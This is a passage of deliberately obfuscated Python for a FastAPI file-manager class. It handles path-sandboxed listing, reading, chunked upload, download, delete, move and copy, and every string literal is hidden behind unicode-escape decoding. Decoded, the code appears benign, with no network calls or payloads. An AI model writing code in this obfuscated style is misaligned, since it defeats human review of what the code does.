        except socket.error:
            return False

    def _is_valid_ipv6(self, O0_var_230: str) -> bool:
        try:
            socket.inet_pton(socket.AF_INET6, O0_var_230)
            return True
        except socket.error:
            return False
import shutil
import stat
import hashlib
import mimetypes
import base64
import json
from pathlib import Path
from datetime import datetime, timezone
from typing import List, Dict, Optional, Union
from fastapi import HTTPException, status, UploadFile
from croniter import croniter

class FileManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u6587\\u4ef6\\u7ba1\\u7406\\u5668\\u0020\\u002d\\u0020\\u5c01\\u88c5\\u6240\\u6709\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u64cd\\u4f5c\\u000a\\u0020\\u0020\\u0020\\u0020\\u5b89\\u5168\\u7279\\u6027\\u003a\\u0020\\u8def\\u5f84\\u6821\\u9a8c\\u3001\\u6743\\u9650\\u68c0\\u67e5\\u3001\\u5ba1\\u8ba1\\u65e5\\u5fd7\\u3001\\u5206\\u5757\\u4e0a\\u4f20\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, root: str, max_upload: int=104857600, chunk_size: int=20971520, audit: bool=True):
        self.O0_fn_57 = Path(root).resolve()
        self.max_upload = max_upload
        self.chunk_size = chunk_size
        self.audit = audit
        self.chunk_dir = self.O0_fn_57 / codecs.decode('\\u002e\\u0070\\u0072\\u006f\\u0078\\u0079\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape')
        self.chunk_dir.mkdir(exist_ok=True)

    def _audit(self, O0_var_231: str, path: str, O0_var_232: str, O0_var_233: dict=None):
        if self.audit:
            O0_var_234 = {codecs.decode('\\u0074\\u0073', 'unicode_escape'): datetime.utcnow().isoformat(), codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'): O0_var_231, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): path, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_232, **(O0_var_233 or {})}
            if os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
                Logger.debug(codecs.decode('\\U0001f4dd\\u0020\\u005b\\u0041\\u0055\\u0044\\u0049\\u0054\\u005d\\u0020', 'unicode_escape') + str(json.dumps(O0_var_234, ensure_ascii=False)))

    def _safe_path(self, O0_var_235: str) -> Path:
        O0_var_235 = (O0_var_235 or codecs.decode('\\u002e', 'unicode_escape')).strip()
        O0_var_236 = Path(O0_var_235)
        if not O0_var_236.is_absolute():
            O0_var_236 = self.O0_fn_57 / O0_var_236
        O0_var_236 = O0_var_236.resolve()
        try:
            O0_var_236.relative_to(self.O0_fn_57)
        except ValueError:
            raise HTTPException(status_code=403, detail=codecs.decode('\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020\\u0027', 'unicode_escape') + str(O0_var_235) + codecs.decode('\\u0027\\u0020\\u006f\\u0075\\u0074\\u0073\\u0069\\u0064\\u0065\\u0020\\u0072\\u006f\\u006f\\u0074\\u0020\\u0027', 'unicode_escape') + str(self.O0_fn_57) + codecs.decode('\\u0027', 'unicode_escape'))
        return O0_var_236

    def _format_info(self, path: Path) -> dict:
        try:
            O0_var_237 = path.lstat() if path.is_symlink() else path.stat()
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path.relative_to(self.O0_fn_57)), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape') if path.is_dir() else codecs.decode('\\u0073\\u0079\\u006d\\u006c\\u0069\\u006e\\u006b', 'unicode_escape') if path.is_symlink() else codecs.decode('\\u0066\\u0069\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_237.st_size, codecs.decode('\\u006d\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'): datetime.fromtimestamp(O0_var_237.st_mtime).isoformat(), codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): stat.filemode(O0_var_237.st_mode), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_237.st_mode)), codecs.decode('\\u006f\\u0077\\u006e\\u0065\\u0072', 'unicode_escape'): str(O0_var_237.st_uid) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_237.st_gid)}
        except Exception as e:
            return {codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): path.name, codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(path), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)}

    def list_files(self, base_path: str, recursive: bool=False) -> dict:
        O0_var_238 = self._safe_path(base_path)
        if not O0_var_238.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        if not O0_var_238.is_dir():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_239 = []
        try:
            O0_var_240 = O0_var_238.rglob(codecs.decode('\\u002a', 'unicode_escape')) if recursive else O0_var_238.iterdir()
            for O0_var_241 in O0_var_240:
                if not recursive and O0_var_241.parent != O0_var_238:
                    continue
                O0_var_239.append(self._format_info(O0_var_241))
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(base_path))
        O0_var_239.sort(key=lambda x: (x.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) != codecs.decode('\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079', 'unicode_escape'), x.get(codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower()))
        self._audit(codecs.decode('\\u006c\\u0069\\u0073\\u0074', 'unicode_escape'), base_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_239)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0075\\u006e\\u0074', 'unicode_escape'): len(O0_var_239), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_239}

    def get_authority(self, O0_var_242: List[str]) -> dict:
        O0_var_243 = []
        for O0_var_244 in O0_var_242:
            try:
                O0_var_245 = self._safe_path(O0_var_244)
                if not O0_var_245.exists():
                    O0_var_243.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_244, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_246 = self._format_info(O0_var_245)
                O0_var_243.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_246[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape'): O0_var_246[codecs.decode('\\u006e\\u0061\\u006d\\u0065', 'unicode_escape')], codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_246.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape')), codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): O0_var_246.get(codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape')), codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): O0_var_246.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')), codecs.decode('\\u0072\\u0065\\u0061\\u0064\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_245, os.R_OK), codecs.decode('\\u0077\\u0072\\u0069\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_245, os.W_OK), codecs.decode('\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0061\\u0062\\u006c\\u0065', 'unicode_escape'): os.access(O0_var_245, os.X_OK)})
            except HTTPException as e:
                O0_var_243.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_244, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_243.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_244, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        self._audit(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), str(O0_var_242), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0069\\u0065\\u0064', 'unicode_escape'): len(O0_var_242)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u0073', 'unicode_escape'): O0_var_243}

    def cat_file(self, file_path: str, O0_var_247: int=1048576) -> dict:
        O0_var_248 = self._safe_path(file_path)
        if not O0_var_248.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_248.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if O0_var_248.stat().st_size > O0_var_247:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u0020\\u0066\\u006f\\u0072\\u0020\\u0063\\u0061\\u0074\\u0020\\u0028\\u003e\\u0031\\u004d\\u0042\\u0029\\u003a\\u0020', 'unicode_escape') + str(file_path))
        try:
            O0_var_249 = O0_var_248.read_text(encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), errors=codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
            O0_var_250 = codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')
            O0_var_251 = False
        except:
            O0_var_249 = base64.b64encode(O0_var_248.read_bytes()).decode()
            O0_var_250 = codecs.decode('\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')
            O0_var_251 = True
        self._audit(codecs.decode('\\u0063\\u0061\\u0074', 'unicode_escape'), file_path, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_248.stat().st_size, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_250})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_248.relative_to(self.O0_fn_57)), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074', 'unicode_escape'): O0_var_249, codecs.decode('\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'): O0_var_250, codecs.decode('\\u0069\\u0073\\u005f\\u0062\\u0069\\u006e\\u0061\\u0072\\u0079', 'unicode_escape'): O0_var_251, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_248.stat().st_size}

    def upload_file(self, file_content: bytes, target_path: str, filename: str=None, chunk_id: int=None, total_chunks: int=None) -> dict:
        O0_var_252 = self._safe_path(target_path)
        if O0_var_252.is_dir():
            if not filename:
                raise HTTPException(400, codecs.decode('\\u0066\\u0069\\u006c\\u0065\\u006e\\u0061\\u006d\\u0065\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u006f\\u0072\\u0079\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
            O0_var_252 = O0_var_252 / filename
        O0_var_252 = self._safe_path(str(O0_var_252))
        if len(file_content) > self.max_upload and chunk_id is None:
            raise HTTPException(413, codecs.decode('\\u0046\\u0069\\u006c\\u0065\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065\\u003a\\u0020\\u0075\\u0073\\u0065\\u0020\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064\\u0020\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
        try:
            O0_var_252.parent.mkdir(parents=True, exist_ok=True)
            if chunk_id is not None and total_chunks is not None:
                O0_var_253 = hashlib.md5(O0_var_252.as_posix().encode()).hexdigest()
                self.chunk_dir.mkdir(parents=True, exist_ok=True)
                O0_var_254 = self.chunk_dir / (str(O0_var_253) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(chunk_id))
                with open(O0_var_254, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_255:
                    O0_var_255.write(file_content)
                O0_var_256 = list(self.chunk_dir.glob(str(O0_var_253) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e\\u002a', 'unicode_escape')))
                if len(O0_var_256) == total_chunks:
                    O0_var_257 = self.chunk_dir / (str(O0_var_253) + codecs.decode('\\u002e\\u006c\\u006f\\u0063\\u006b', 'unicode_escape'))
                    try:
                        with open(O0_var_257, codecs.decode('\\u0078', 'unicode_escape')):
                            pass
                    except FileExistsError:
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_256), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks, codecs.decode('\\u006d\\u0073\\u0067', 'unicode_escape'): codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0069\\u006e\\u0067\\u0020\\u0069\\u006e\\u0020\\u0070\\u0072\\u006f\\u0067\\u0072\\u0065\\u0073\\u0073', 'unicode_escape')}
                    try:
                        with open(O0_var_252, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_258:
                            for O0_var_259 in range(total_chunks):
                                O0_var_260 = self.chunk_dir / (str(O0_var_253) + codecs.decode('\\u002e\\u0063\\u0068\\u0075\\u006e\\u006b\\u002e', 'unicode_escape') + str(O0_var_259))
                                with open(O0_var_260, codecs.decode('\\u0072\\u0062', 'unicode_escape')) as O0_var_261:
                                    O0_var_258.write(O0_var_261.read())
                                O0_var_260.unlink()
                        self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u005f\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'), str(O0_var_252), codecs.decode('\\u006d\\u0065\\u0072\\u0067\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0073', 'unicode_escape'): total_chunks, codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_252.stat().st_size})
                        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_252.relative_to(self.O0_fn_57)), codecs.decode('\\u0063\\u0068\\u0075\\u006e\\u006b\\u0065\\u0064', 'unicode_escape'): True}
                    finally:
                        if O0_var_257.exists():
                            O0_var_257.unlink()
                else:
                    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0070\\u0065\\u006e\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'): len(O0_var_256), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): total_chunks}
            else:
                with open(O0_var_252, codecs.decode('\\u0077\\u0062', 'unicode_escape')) as O0_var_255:
                    O0_var_255.write(file_content)
                self._audit(codecs.decode('\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_252), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): len(file_content)})
                return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_252.relative_to(self.O0_fn_57))}
        except PermissionError:
            raise HTTPException(403, codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape'))
        except Exception as e:
            raise HTTPException(500, codecs.decode('\\u0055\\u0070\\u006c\\u006f\\u0061\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))

    def download_file(self, file_path: str) -> tuple:
        O0_var_262 = self._safe_path(file_path)
        if not O0_var_262.exists():
            raise HTTPException(404, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u003a\\u0020', 'unicode_escape') + str(file_path))
        if not O0_var_262.is_file():
            raise HTTPException(400, codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0066\\u0069\\u006c\\u0065\\u003a\\u0020', 'unicode_escape') + str(file_path))
        O0_var_263, O0_var_264 = mimetypes.guess_type(str(O0_var_262))
        self._audit(codecs.decode('\\u0064\\u006f\\u0077\\u006e\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'), str(O0_var_262), codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u0073\\u0069\\u007a\\u0065', 'unicode_escape'): O0_var_262.stat().st_size})
        return (O0_var_262, O0_var_263 or codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006f\\u0063\\u0074\\u0065\\u0074\\u002d\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'), O0_var_262.stat().st_size)

    def delete_paths(self, O0_var_265: List[str]) -> dict:
        O0_var_266 = []
        for O0_var_267 in O0_var_265:
            try:
                O0_var_268 = self._safe_path(O0_var_267)
                if not O0_var_268.exists():
                    O0_var_266.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_267, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006e\\u006f\\u0074\\u005f\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_268.is_dir():
                    shutil.rmtree(O0_var_268)
                else:
                    O0_var_268.unlink()
                O0_var_266.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_267, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape')})
                self._audit(codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065', 'unicode_escape'), O0_var_267, codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_266.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_267, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_266.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_267, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_266}

    def move_paths(self, O0_var_269: Dict[str, str]) -> dict:
        O0_var_270 = []
        for O0_var_271, O0_var_272 in O0_var_269.items():
            try:
                O0_var_273 = self._safe_path(O0_var_271)
                O0_var_274 = self._safe_path(O0_var_272)
                if not O0_var_273.exists():
                    O0_var_270.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_271, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_272, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_274.exists():
                    O0_var_270.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_271, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_272, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                O0_var_274.parent.mkdir(parents=True, exist_ok=True)
                shutil.move(str(O0_var_273), str(O0_var_274))
                O0_var_270.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_273.relative_to(self.O0_fn_57)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_274.relative_to(self.O0_fn_57)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(O0_var_271) + codecs.decode('\\u0020\\u002d\\u003e\\u0020', 'unicode_escape') + str(O0_var_272), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            except HTTPException as e:
                O0_var_270.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_271, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_272, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except Exception as e:
                O0_var_270.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_271, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_272, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
        O0_var_275 = sum((1 for O0_var_276 in O0_var_270 if O0_var_276[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        self._audit(codecs.decode('\\u006d\\u006f\\u0076\\u0065\\u005f\\u0062\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), str(list(O0_var_269.keys())), codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'), {codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_269), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_275})
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_275 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_269), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_275, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_270}

    def copy_paths(self, O0_var_277: Dict[str, str]) -> dict:
        O0_var_278 = []
        for O0_var_279, O0_var_280 in O0_var_277.items():
            try:
                O0_var_281 = self._safe_path(O0_var_279)
                O0_var_282 = self._safe_path(O0_var_280)
                if not O0_var_281.exists():
                    O0_var_278.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_279, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_280, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u0020\\u006e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                if O0_var_282.is_dir():
                    O0_var_282 = O0_var_282 / O0_var_281.name
                if O0_var_282.exists():
                    O0_var_278.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): O0_var_279, codecs.decode('\\u0074\\u006f', 'unicode_escape'): O0_var_280, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0073\\u0074\\u0069\\u006e\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073', 'unicode_escape')})
                    continue
                O0_var_282.parent.mkdir(parents=True, exist_ok=True)
                if O0_var_281.is_file():
                    shutil.copy2(str(O0_var_281), str(O0_var_282))
                else:
                    shutil.copytree(str(O0_var_281), str(O0_var_282))
                O0_var_278.append({codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'): str(O0_var_281.relative_to(self.O0_fn_57)), codecs.decode('\\u0074\\u006f', 'unicode_escape'): str(O0_var_282.relative_to(self.O0_fn_57)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
